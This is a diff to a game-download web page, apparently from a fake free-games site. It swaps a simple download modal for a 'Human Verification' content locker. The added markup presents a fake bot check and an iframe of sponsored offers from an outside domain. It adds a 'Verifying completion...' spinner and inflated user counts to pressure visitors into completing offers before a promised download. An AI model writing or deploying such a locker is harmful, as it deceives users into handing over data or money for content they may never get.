@@ -79,46 +79,92 @@
         </div>
     </section>
 
-    <!-- ===== GAME DETAIL MODAL ===== -->
+    <!-- ===== HUMAN VERIFICATION / CONTENT LOCKER MODAL ===== -->
     <div class="modal-overlay" id="game-modal">
-        <div class="modal-card" id="modal-card">
-            <button class="modal-close" id="modal-close" aria-label="Close modal">
+        <div class="locker-page" id="locker-page">
+            <!-- Close Button -->
+            <button class="locker-close" id="modal-close" aria-label="Close">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                     <path d="M18 6 6 18M6 6l12 12"></path>
                 </svg>
             </button>
-            <div class="modal-body">
-                <div class="modal-icon-wrapper">
-                    <img id="modal-icon" src="" alt="Game Icon" class="modal-game-icon">
-                </div>
-                <div class="modal-platforms">
-                    <svg class="platform-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M17.523 2c-.587.006-1.266.16-2.014.512C14.39 3.08 13.2 4.12 12.003 5.6 10.806 4.12 9.616 3.08 8.497 2.512 7.155 1.832 5.993 1.856 5.17 2.52c-.892.72-1.075 1.825-.95 2.74.124.91.507 1.82.93 2.546.42.726.873 1.27 1.15 1.58H3.5A1.5 1.5 0 0 0 2 10.886v2a1.5 1.5 0 0 0 1.5 1.5h.5v6.228a1.5 1.5 0 0 0 1.5 1.5h13a1.5 1.5 0 0 0 1.5-1.5v-6.229h.5a1.5 1.5 0 0 0 1.5-1.5v-2a1.5 1.5 0 0 0-1.5-1.5H17.7c.277-.31.73-.854 1.15-1.58.423-.726.806-1.635.93-2.545.125-.916-.058-2.022-.95-2.74A2.034 2.034 0 0 0 17.523 2z"/></svg>
-                    <svg class="platform-icon" viewBox="0 0 384 512" fill="currentColor"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>
-                    <span class="modal-separator">|</span>
-                    <span class="modal-rating">
-                        <svg class="star-icon" viewBox="0 0 24 24" fill="#fbbf24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01L12 2z"/></svg>
-                        <span id="modal-rating-value">4.9</span>
-                    </span>
-                    <span class="modal-separator">|</span>
-                    <span class="modal-downloads">
-                        <svg class="download-count-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
-                        <span id="modal-downloads-value">9M+</span>
-                    </span>
-                </div>
-                <h2 class="modal-game-title" id="modal-title">Game Title</h2>
-                <p class="modal-game-subtitle" id="modal-subtitle">Game Subtitle</p>
-                
-                <div class="modal-divider"></div>
 
-                <div class="modal-download-section">
-                    <h3 class="download-ready-text">Download ready</h3>
-                    <p class="download-click-text">Click Here</p>
+            <!-- Top Glow -->
+            <div class="locker-top-glow"></div>
+
+            <!-- Game Icon at Top -->
+            <div class="locker-game-icon-wrap">
+                <img id="modal-icon" src="" alt="Game Icon" class="locker-game-img">
+            </div>
+
+            <!-- Title -->
+            <h1 class="locker-title">Human <span class="locker-title-accent">Verification</span></h1>
+
+            <!-- Subtitle -->
+            <p class="locker-subtitle">Complete <span class="locker-highlight">One</span> of the verification methods below to prove that you are a <span class="locker-highlight-underline">Human</span> & not a BOT.</p>
+
+            <!-- Steps Indicator -->
+            <div class="locker-steps">
+                <div class="locker-step completed">
+                    <div class="locker-step-circle">1</div>
+                    <span class="locker-step-label">SELECT</span>
                 </div>
-                
-                <a href="#" class="modal-download-btn" id="modal-download-btn">
-                    <svg class="btn-download-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
-                    DOWNLOAD
-                </a>
+                <div class="locker-step-line completed"></div>
+                <div class="locker-step active">
+                    <div class="locker-step-circle">2</div>
+                    <span class="locker-step-label">VERIFY</span>
+                </div>
+                <div class="locker-step-line"></div>
+                <div class="locker-step">
+                    <div class="locker-step-circle">3</div>
+                    <span class="locker-step-label">DOWNLOAD</span>
+                </div>
+            </div>
+
+            <!-- Content Locker Offers Container -->
+            <div class="locker-offers-section">
+                <div class="locker-offers-header">
+                    <span class="locker-offers-icon">🎁</span>
+                    <div>
+                        <h3 class="locker-offers-title">Available Offers</h3>
+                        <p class="locker-offers-desc">Choose any one offer to continue</p>
+                    </div>
+                </div>
+
+                <!-- Content Locker iframe -->
+                <div id="ogads-locker-container">
+                    <iframe 
+                        id="locker-iframe"
+                        src="https://appchecker.space/cl/i/xppw39" 
+                        frameborder="0" 
+                        scrolling="yes"
+                        allowtransparency="true"
+                        style="width:100%; min-height:350px; border:none; border-radius:10px; background:transparent;">
+                    </iframe>
+                </div>
+            </div>
+
+            <!-- Verifying Section -->
+            <div class="locker-verifying">
+                <div class="locker-spinner"></div>
+                <p class="locker-verifying-text">Verifying completion...</p>
+                <p class="locker-verifying-timer" id="locker-timer">--:--</p>
+            </div>
+
+            <!-- Bottom Stats Bar -->
+            <div class="locker-bottom-bar">
+                <div class="locker-stat">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="locker-stat-icon"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                    <span>239,662,331</span>
+                </div>
+                <div class="locker-stat">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="locker-stat-icon"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+                    <span>Instant Access</span>
+                </div>
+                <div class="locker-stat">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="locker-stat-icon"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                    <span>Verified Offers</span>
+                </div>
             </div>
         </div>
     </div>
